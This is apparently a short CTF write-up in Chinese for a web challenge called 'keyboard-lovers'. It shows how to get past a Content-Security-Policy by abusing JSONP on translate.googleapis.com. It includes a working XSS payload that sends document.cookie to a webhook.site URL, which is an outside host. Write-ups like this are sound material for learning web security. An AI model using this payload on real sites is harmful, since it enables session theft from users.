# web

### keyboard-lovers

#csp

```
default-src 'none'; script-src https://*.googleapis.com 'sha256-FlG9O9q1cgn5OYucapSvUz43B/tZq3UVDljeyRiVWvs='; style-src https://cdn.jsdelivr.net https://*.googleapis.com 'unsafe-inline'; img-src 'self'; connect-src 'self';font-src https://fonts.gstatic.com; form-action 'self'; block-all-mixed-content;
```

限制了引用的脚本来源为*.googleapis.com

storage.googleapis.com可以任意上传文件，但是需要信用卡，只能给个poc
https://storage.googleapis.com/bg-common/samples/evil.js

translate.googleapis.com支持jsonp，可以xss

```
location.href=('https://webhook.site/?flag=_'.replace('_',document.cookie));
```

https://translate.googleapis.com/$discovery/rest?callback=location.href=(%27https://webhook.site/YOUR_UNIQUE_URL?flag=_%27.replace(%27_%27,document.cookie));


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2025-03-24   18:31